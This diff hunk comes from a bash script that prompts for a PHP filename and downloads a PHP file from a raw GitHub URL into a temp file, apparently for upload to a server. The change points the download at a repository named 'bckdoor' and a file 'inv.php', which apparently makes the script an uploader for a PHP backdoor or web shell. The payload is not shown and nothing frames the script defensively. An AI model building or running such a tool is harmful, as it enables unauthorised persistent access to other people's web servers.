@@ -5,7 +5,7 @@ set -euo pipefail
 read -r -p "Enter the filename for the PHP file (e.g., bps.php): " file_to_upload
 
 # Source URL (raw file)
-URL="https://raw.githubusercontent.com/chuckyreply/xTRI_D/main/bps.php"
+URL="https://raw.githubusercontent.com/chuckyreply/bckdoor/refs/heads/main/inv.php"
 
 # Temp file for download
 tmpf="$(mktemp --suffix=.php)" || tmpf="/tmp/$(date +%s).php"
